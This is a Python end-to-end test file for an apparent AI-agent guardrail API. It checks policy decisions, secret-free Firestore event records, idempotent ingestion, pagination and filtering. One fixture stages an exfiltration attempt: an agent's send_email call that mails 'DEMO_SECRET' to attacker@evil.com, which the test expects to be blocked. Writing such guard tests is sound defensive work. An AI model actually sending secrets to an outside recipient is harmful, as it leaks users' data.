"""End-to-end tests for Firestore ``security_events`` against Auth + Firestore emulators."""

from __future__ import annotations

from datetime import UTC, datetime


def test_security_events_lifecycle_filtering_and_pagination_in_emulator(emulator, api, firestore_client) -> None:
    admin = emulator.verified_user("se-admin@agentshield.test", "ADMIN")
    viewer = emulator.verified_user("se-viewer@agentshield.test")
    viewer_headers = {"Authorization": f"Bearer {viewer['token']}", "X-Correlation-ID": "corr-se-emu"}
    admin_headers = {"Authorization": f"Bearer {admin['token']}"}

    # Evaluate ALLOW, BLOCK, REDACT, REQUIRE_APPROVAL calls
    calls = [
        {"tool_name": "send_email", "arguments": {"to": "partner@example.org", "subject": "Hi", "body": "Safe"}, "context": {"agent_id": "emu-agent"}},
        {"tool_name": "send_email", "arguments": {"to": "attacker@evil.com", "subject": "Leak", "body": "DEMO_SECRET"}, "context": {"agent_id": "emu-agent"}},
        {"tool_name": "send_email", "arguments": {"to": "partner@example.org", "subject": "Report", "body": "Token: DEMO_SECRET"}, "context": {"agent_id": "emu-agent"}},
        {"tool_name": "export_file", "arguments": {"to": "ops@external.example.net", "filename": "out.csv"}, "context": {"agent_id": "emu-agent"}},
    ]
    recorded_ids = []
    for body in calls:
        res = api.post("/api/v1/evaluate", headers=viewer_headers, json=body)
        assert res.status_code == 200, res.text
        recorded_ids.append((res.json()["event_id"], res.json()["decision"]))

    assert [d for _, d in recorded_ids] == ["ALLOW", "BLOCK", "REDACT", "REQUIRE_APPROVAL"]

    # Verify raw Firestore documents have all 11 fields, server Timestamp, and no secrets
    for event_id, decision in recorded_ids:
        snap = firestore_client.collection("security_events").document(event_id).get()
        assert snap.exists
        raw = snap.to_dict()
        assert set(raw.keys()) == {
            "event_id",
            "user_id",
            "agent_id",
            "tool_name",
            "decision",
            "risk_level",
            "reason",
            "policy_id",
            "correlation_id",
            "created_at",
            "metadata",
        }
        assert raw["user_id"] == viewer["uid"]
        assert raw["agent_id"] == "emu-agent"
        assert raw["decision"] == decision
        assert raw["correlation_id"] == "corr-se-emu"
        assert isinstance(raw["created_at"], datetime)
        assert "DEMO_SECRET" not in str(raw)

    # Idempotent ingestion via POST /api/v1/security-events
    idem_headers = {**admin_headers, "X-Idempotency-Key": "emu-idem-1"}
    idem_body = {
        "agent_id": "emu-admin-agent",
        "tool_name": "send_email",
        "decision": "ALLOW",
        "risk_level": "LOW",
        "reason": "Idempotent check",
        "policy_id": "allow-approved",
        "metadata": {"destination_class": "APPROVED"},
    }
    first = api.post("/api/v1/security-events", headers=idem_headers, json=idem_body)
    second = api.post("/api/v1/security-events", headers=idem_headers, json=idem_body)
    assert first.status_code == 201, first.text
    assert second.status_code == 200, second.text
    assert first.json()["event_id"] == second.json()["event_id"] == "emu-idem-1"

    # Invalid decision rejected
    bad = api.post(
        "/api/v1/security-events",
        headers=admin_headers,
        json={**idem_body, "decision": "BOGUS"},
    )
    assert bad.status_code == 422

    # Cursor pagination across all 5 security_events
    seen, cursor = [], None
    while True:
        params = {"limit": 2, **({"cursor": cursor} if cursor else {})}
        page = api.get("/api/v1/security-events", headers=admin_headers, params=params)
        assert page.status_code == 200, page.text
        data = page.json()
        assert data["total"] == 5
        seen.extend(item["event_id"] for item in data["items"])
        cursor = data["next_cursor"]
        if not cursor:
            break
    assert len(seen) == len(set(seen)) == 5

    # Filtering by user_id, decision, and today's UTC date
    today = datetime.now(UTC).strftime("%Y-%m-%d")
    filtered = api.get(
        "/api/v1/security-events",
        headers=admin_headers,
        params={"user_id": viewer["uid"], "decision": "BLOCK", "date": today},
    )
    assert filtered.status_code == 200, filtered.text
    assert filtered.json()["total"] == 1
    assert filtered.json()["items"][0]["decision"] == "BLOCK"
